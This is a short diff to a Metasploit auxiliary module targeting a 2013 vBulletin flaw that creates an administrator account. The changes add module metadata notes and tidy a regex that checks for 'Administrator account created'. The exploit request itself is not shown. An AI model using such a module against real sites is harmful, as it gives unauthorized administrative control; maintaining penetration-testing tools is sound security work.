@@ -28,7 +28,12 @@ class MetasploitModule < Msf::Auxiliary
           [ 'OSVDB', '98370' ],
           [ 'URL', 'http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/3991423-potential-vbulletin-exploit-vbulletin-4-1-vbulletin-5']
         ],
-        'DisclosureDate' => '2013-10-09'
+        'DisclosureDate' => '2013-10-09',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+          'Reliability' => []
+        }
       )
     )
 
@@ -82,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
 
-    if res && (res.code == 200) && res.body =~ (/Administrator account created/)
+    if res && (res.code == 200) && res.body =~ /Administrator account created/
       print_good("Admin account with credentials #{user}:#{pass} successfully created")
       connection_details = {
         module_fullname: fullname,
